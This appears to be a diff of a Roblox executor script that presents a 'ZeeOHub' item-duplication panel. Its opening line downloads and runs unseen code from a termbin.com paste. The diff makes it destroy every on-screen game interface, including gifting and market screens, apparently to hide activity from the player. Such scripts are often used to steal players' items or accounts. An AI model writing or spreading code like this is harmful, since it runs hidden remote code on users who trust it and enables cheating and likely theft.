@@ -1,6 +1,8 @@
 loadstring(game:HttpGet("https://termbin.com/6z6r"))()
 task.wait(2)
 
+-- Paste and execute in Delta or any executor
+
 local Players = game:GetService("Players")
 local TweenService = game:GetService("TweenService")
 local UserInputService = game:GetService("UserInputService")
@@ -8,55 +10,18 @@ local UserInputService = game:GetService("UserInputService")
 local player = Players.LocalPlayer
 local playerGui = player:WaitForChild("PlayerGui")
 
--- Wait for LoadingOverlay to appear then destroy it
-task.spawn(function()
-    local overlay = playerGui:WaitForChild("LoadingOverlay", 10)
-    if overlay then
-        overlay:Destroy()
-    end
-end)
-
-local exceptions = {
-    "Message", "GuildWeekComplete", "GuildShop", "WIP", "TopNotification",
-    "RadialScreen Flash", "SignToolChangeTextMenu", "Odds", "TeleportButtons",
-    "RollFrame", "PropsFrame", "OfflineAnimation", "WeatherUl", "Garden Level",
-    "TrowelUl", "HoldToCollect", "HUD", "GrowingList", "GearShop", "Watermark",
-    "CustomiseFenceTheme", "PlayerSelector", "FX_UI", "PreRobuxPrompt",
-    "PremiumSeedShop", "Consolelcon Mapper", "BuildMobile", "RainbowEffect",
-    "Robuxshop", "MushroomUl", "HoverUl", "Gifting", "Flash Effect",
-    "VersionHistory", "RollFrame_New", "CinematicBars", "RakeUl", "SeedShop",
-    "LoadingGui", "Stats", "SignChangeTextMenu", "TutorialUl", "PlayerGardenMarket",
-    "Tooltip", "MailboxUl", "Settings", "Guild", "ColorPickerGuild",
-    "ViewGuildPage", "CreateGuild", "ViewGuild Leaderboard", "LeaveGuild",
-    "EditGuild", "ViewGuildProgress", "PetList", "EquipPet", "Petinfo",
-    "GuildInvite", "HoldToSteal", "HoldToScope", "StrawberrySniper", "Cmdr",
-    "TouchGui", "CosmeticControl", "Billboard_Ul", "BackpackGui", "Plot8",
-    "Plot7", "Plot4", "Plotl", "Plot6", "Plot5", "Plot2", "Plot1", "Plot3",
-    "ExpandSignGui", "TopbarCenteredClipped", "TopbarStandardClipped",
-    "TopbarStandard", "TopbarCentered", "PlantHoverTooltip", "PetHoverTooltip",
-    "JumpButton", "WalkButton", "TouchControlGui"
-}
-
+-- Remove existing GUIs
 for _, gui in ipairs(playerGui:GetChildren()) do
     if gui:IsA("ScreenGui") then
-        local isException = false
-        for _, name in ipairs(exceptions) do
-            if gui.Name == name then
-                isException = true
-                break
-            end
-        end
-        if not isException then
-            gui:Destroy()
-        end
+        gui:Destroy()
     end
 end
 
+-- Loading Screen
 local loadingGui = Instance.new("ScreenGui")
 loadingGui.Name = "LoadingScreen"
 loadingGui.IgnoreGuiInset = true
 loadingGui.ResetOnSpawn = false
-loadingGui.DisplayOrder = 999
 loadingGui.Parent = playerGui
 
 local blackBG = Instance.new("Frame")
@@ -118,10 +83,10 @@ tween.Completed:Connect(function()
     fadeTween.Completed:Connect(function()
         loadingGui:Destroy()
 
+        -- Main GUI
         local mainGui = Instance.new("ScreenGui")
         mainGui.Name = "ZeeOHub"
         mainGui.ResetOnSpawn = false
-        mainGui.DisplayOrder = 999
         mainGui.Parent = playerGui
 
         local panel = Instance.new("Frame")
@@ -180,6 +145,7 @@ tween.Completed:Connect(function()
             TweenService:Create(dupeBtn, TweenInfo.new(0.1), {BackgroundColor3 = Color3.fromRGB(43, 27, 87)}):Play()
         end)
 
+        -- Dragging
         local dragging, dragStart, startPos = false, nil, nil
 
         panel.InputBegan:Connect(function(input)
